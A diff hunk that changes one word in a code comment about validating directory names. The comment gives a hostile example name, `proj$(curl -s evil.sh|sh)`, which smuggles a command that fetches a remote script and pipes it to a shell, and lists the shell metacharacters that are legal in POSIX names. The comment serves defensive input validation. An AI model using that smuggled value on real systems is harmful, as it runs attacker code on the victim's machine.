@@ -1507,7 +1507,7 @@
     // `proj$(curl -s evil.sh|sh)` takes no code execution to create — an
     // unpacked archive or a package postinstall will do — and $, `, ;, |, &,
     // (, ), <, > are all legal in a POSIX name and none is a control character,
-    // so stripping control characters at ingest does not touch them.
+    // so refusing control characters at ingest does not touch them.
     //
     // Permitted: Unicode letters, marks and digits, so accented and CJK
     // directory names copy normally; the space, because ~/Library/Application
